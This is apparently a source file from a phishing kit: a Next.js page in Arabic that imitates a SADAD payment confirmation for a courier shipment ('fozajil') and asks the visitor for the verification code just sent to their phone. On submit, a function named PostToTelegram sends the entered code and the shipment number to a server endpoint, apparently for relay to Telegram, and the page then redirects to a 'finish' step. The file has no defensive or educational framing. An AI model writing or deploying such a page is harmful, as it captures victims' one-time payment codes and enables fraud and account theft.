"use client";

import styles from "./code.module.css";
import { useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";

const Code = () => {
  const router = useRouter();
  const x = useSearchParams();
  const datas = x.get("names");

  const [form, setForm] = useState({
    data: {
      كود_الثاني: "",
      رقم_الشحنة: datas,
    },
  });

  const setDynamicFormData = (name, value) => {
    setForm((prev) => ({
      data: {
        ...prev.data,
        [name]: value,
      },
    }));
  };

  const PostToTelegram = async () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");

    await fetch("/api/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ description }),
    });
  };

  const handlerout = () => {
    if (form.data.كود_الاول.trim() === "") {
      alert("من فضلك قم بملىء الحقول");
    } else {
      router.push(`/fozajil/pay/code/finish?names=${datas}`);
    }
  };

  return (
    <div className={styles.contect}>
      <div>
        <div>
          <img src="/sadad.png" alt="sadad" />
          <img src="/تنزيل4.png" alt="تنزيل" />
        </div>

        <h1>تأكيد</h1>
        <p>ادخال الكود المرسل حديثا على هاتفك</p>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            PostToTelegram();
            handlerout();
          }}
        >
          <input
            type="text"
            name="كود_الثاني"
            value={form.data.كود_الاول}
            onChange={(e) => {
              const { name, value } = e.target;
              setDynamicFormData(name, value);
            }}
            placeholder="ادخل كود التحقق"
          />

          <button type="submit">دخول</button>
        </form>

        <img src="/footersadad.png" alt="footersadad" />
      </div>
    </div>
  );
};

export default Code;
